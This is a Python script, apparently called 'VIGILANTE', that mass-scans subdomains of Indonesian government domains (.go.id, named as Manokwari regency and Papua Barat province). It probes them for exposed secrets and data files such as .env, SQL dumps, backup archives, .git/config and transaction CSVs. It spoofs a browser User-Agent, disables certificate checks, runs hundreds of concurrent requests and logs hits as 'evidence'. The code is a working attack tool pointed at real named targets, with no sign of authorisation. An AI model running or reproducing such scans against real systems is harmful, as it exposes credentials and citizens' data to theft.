
# ==============================================================================
#  __      __ _____  _____  _____  _               _   _  _______  ______ 
#  \ \    / /|_   _|/ ____||_   _|| |             /\  | \ | ||__   __||  ____|
#   \ \  / /   | | | |  __   | |  | |            /  \ |  \| |   | |   | |__   
#    \ \/ /    | | | | |_ |  | |  | |           / /\ \| . ` |   | |   |  __|  
#     \  /    _| |_| |__| | _| |_ | |____      / ____ \ |\  |   | |   | |____ 
#      \/    |_____|\_____||_____||______|    /_/    \_\_| \_|   |_|   |______|
# 
#  VIGILANTE - Scutum in tenebris, ensis pro inermibus
# ==============================================================================
# Target: Multi-Core Omni-Node Hunter (Parallel Processing + AsyncIO)
# Environment: Linux / Parrot OS (Optimized for Dual/Quad Core CPUs)
# ==============================================================================

import asyncio
import aiohttp
import sys
import re
import multiprocessing
import os

# The "Lethal Payload" list: Highly sensitive backup and config files
PAYLOADS = [
    "/.env",
    "/backup.zip",
    "/backup.sql",
    "/db.sql",
    "/database.sql",
    "/transaksi.csv",
    "/data.csv",
    "/backup.tar.gz",
    "/.git/config",
    "/admin/export.csv"
]

async def fetch(session, url):
    """Executes the HTTP GET request and checks for success."""
    try:
        async with session.get(url, timeout=7, ssl=False) as response:
            if response.status == 200:
                content_length = response.headers.get('Content-Length')
                if content_length and int(content_length) > 100:
                    return url, True
                else:
                    content = await response.content.read(256)
                    if b"<!DOCTYPE html>" not in content and b"<html" not in content.lower():
                        return url, True
            return url, False
    except Exception:
        return url, False

async def bound_fetch(sem, session, url):
    """Limits concurrent connections per process."""
    async with sem:
        return await fetch(session, url)

async def run_omni_hunt(subdomains_file, output_log_file):
    """Core asynchronous scanner for a single target list."""
    domains = set()
    try:
        with open(subdomains_file, 'r') as f:
            content = f.read()
            found = re.findall(r'([a-zA-Z0-9.-]+\.go\.id)', content)
            domains.update(found)
    except FileNotFoundError:
        print(f"[!] CORE ERROR: {subdomains_file} not found.")
        return

    print(f"[*] Thread Spawned for {subdomains_file} | Loaded {len(domains)} nodes.")
    
    tasks = []
    sem = asyncio.Semaphore(100) # Max 100 concurrent requests per CPU core
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
    
    async with aiohttp.ClientSession(headers=headers) as session:
        for domain in domains:
            for payload in PAYLOADS:
                tasks.append(asyncio.create_task(bound_fetch(sem, session, f"http://{domain}{payload}")))
                tasks.append(asyncio.create_task(bound_fetch(sem, session, f"https://{domain}{payload}")))

        results = await asyncio.gather(*tasks)
        
    hits = 0
    with open(output_log_file, "w") as log_file:
        for url, success in results:
            if success:
                hits += 1
                print(f"\033[91m[CRITICAL HIT]\033[0m {url}")
                log_file.write(f"{url}\n")
                
    print(f"[-] Sub-Process Complete: {subdomains_file} | Total Exposed Assets: {hits}")

def process_wrapper(target_file, output_log):
    """Wrapper to initialize asyncio loop within a multiprocessing thread."""
    if sys.platform.startswith("win"):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(run_omni_hunt(target_file, output_log))

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 omni_orchestrator.py <file1.txt> <file2.txt>")
        print("Example: python3 omni_orchestrator.py subdomain_manokwarikab.txt subdomain_papuabaratprov.txt")
        sys.exit(1)
        
    file_kabupaten = sys.argv[1]
    file_provinsi = sys.argv[2]
    
    log_kabupaten = "exposed_manokwari.log"
    log_provinsi = "exposed_provinsi.log"

    print("=" * 75)
    print("[*] INITIATING MULTI-CORE OMNI-HUNTER")
    print(f"[*] CORE 0 TARGET : {file_kabupaten}")
    print(f"[*] CORE 1 TARGET : {file_provinsi}")
    print("=" * 75)

    # Spawning parallel operating system processes
    p1 = multiprocessing.Process(target=process_wrapper, args=(file_kabupaten, log_kabupaten))
    p2 = multiprocessing.Process(target=process_wrapper, args=(file_provinsi, log_provinsi))

    # Engage
    p1.start()
    p2.start()

    # Wait for both vectors to finish their assault
    p1.join()
    p2.join()

    print("=" * 75)
    print("[+] ALL CORES REPORTING TASK COMPLETION.")
    print(f"[*] Evidence saved to {log_kabupaten} and {log_provinsi}.")
    print("=" * 75)
